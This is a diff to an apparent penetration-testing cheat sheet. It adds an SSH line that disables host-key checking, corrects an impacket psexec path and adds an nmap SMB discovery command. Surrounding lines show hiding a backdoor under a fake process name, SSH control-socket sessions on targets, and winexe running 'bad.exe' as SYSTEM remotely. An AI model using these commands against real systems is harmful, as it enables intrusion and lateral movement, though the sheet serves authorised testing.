@@ -139,6 +139,7 @@ bash -c "exec -a <new name> <backdoor>"                   #starts a back door re
 
 
 ******************** SSH Tricks  *****************************
+ssh root@1.1.1.1 -v -o "UserKnownHostsFile /dev/null" -o "StrictHostKeyChecking no" #SSH Masquerade
 cat localfile.txt | ssh user@<ip> " cat > file"                                     #SSH file transfer
 ssh -N -M -S /tmp/sshtgt1 user@1.1.1.1                                              #Creates a Control Socket at /tmp/sshtgt1
 ssh -S /tmp/sshtgt1 -O forward user@1.1.1.1                                         #Creates an interractive session on target using existing sockets.
@@ -309,7 +310,7 @@ wmis -U DOMAIN\ user % password // DC cmd.exe /c command
 mount.cifs // ip /share /mnt/share -o user= user ,pass= pass ,sec=ntlmssp,domain= domain ,rw        # Mounts to /mnt/share. For other options besides ntlmssp, man mount.cifs
 
 enum4linux <IP>                                                                 #A very detailed remote SMB enumeration 
-/usr/share/doc/python_impacket/exmaples/psexec.py domain/user:'password'@<ip>   #psexec but cleaner
+/usr/share/doc/python-impacket/examples/psexec.py domain/user:'password'@<ip>   #psexec but cleaner
 winexe -u domain.name/username //ip C:\\windows\\bad.exe --system               #Executes Bad.exe on remote windows box.  if no program is listed will default to cmd.exe
 
 ********************  PFSense ***********************
@@ -1116,7 +1117,7 @@ GET / http/1.0
 
 rpcinfo -p <ip>             #unumerates linux boxes, needs apt-get install rpcbind nfs-common
 rpcclient -U "" <IP>        #enum windows boxes
-
+nmap --script smb-os-discovery.nse -p445 <IP>
 
 
 ********************  TTL Fingerprints ***********************
